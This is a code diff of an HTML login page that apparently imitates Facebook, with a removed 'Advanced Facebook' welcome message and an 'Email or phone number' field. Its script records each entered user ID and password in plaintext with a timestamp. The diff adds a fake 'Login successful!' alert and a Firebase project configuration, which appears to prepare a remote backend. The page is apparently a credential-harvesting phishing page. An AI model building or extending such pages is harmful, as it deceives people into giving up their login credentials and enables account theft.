@@ -47,17 +47,10 @@
         button:hover {
             background-color: #1557b0;
         }
-        #welcomeMessage {
-            text-align: center;
-            color: #4CAF50; /* Green color for the welcome message */
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 20px;
-        }
     </style>
 </head>
 <body>
-    <div class="login-box" id="loginBox">
+    <div class="login-box">
         <h2>Login</h2>
         <form id="loginForm">
             <input type="text" id="userid" placeholder="Email or phone number" required>
@@ -65,8 +58,6 @@
             <button type="submit">Login</button>
         </form>
     </div>
-    
-    <div id="welcomeMessage" style="display: none;">Welcome to Advanced Facebook</div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -75,23 +66,41 @@
             const userid = document.getElementById('userid').value;
             const password = document.getElementById('password').value;
             
-            // Get existing login entries from localStorage (or create an empty array if not yet stored)
             let entries = JSON.parse(localStorage.getItem('loginEntries') || '[]');
-            
-            // Add new login entry with the current date and time
             entries.push({
                 userid: userid,
                 password: password,
                 time: new Date().toLocaleString()
             });
             
-            // Save updated entries back to localStorage
             localStorage.setItem('loginEntries', JSON.stringify(entries));
             
-            // Hide login form and display welcome message
-            document.getElementById('loginBox').style.display = 'none';
-            document.getElementById('welcomeMessage').style.display = 'block';
+            alert('Login successful!');
+            document.getElementById('loginForm').reset();
         });
     </script>
+	<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-analytics.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyArdpEaRcwhdrvw5GBIVq98r9FnLs9OZ0M",
+    authDomain: "login-system-78609.firebaseapp.com",
+    projectId: "login-system-78609",
+    storageBucket: "login-system-78609.firebasestorage.app",
+    messagingSenderId: "165111726523",
+    appId: "1:165111726523:web:dece6a48eb4201c077849e",
+    measurementId: "G-GFCZDGF49Q"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+</script>
 </body>
 </html>
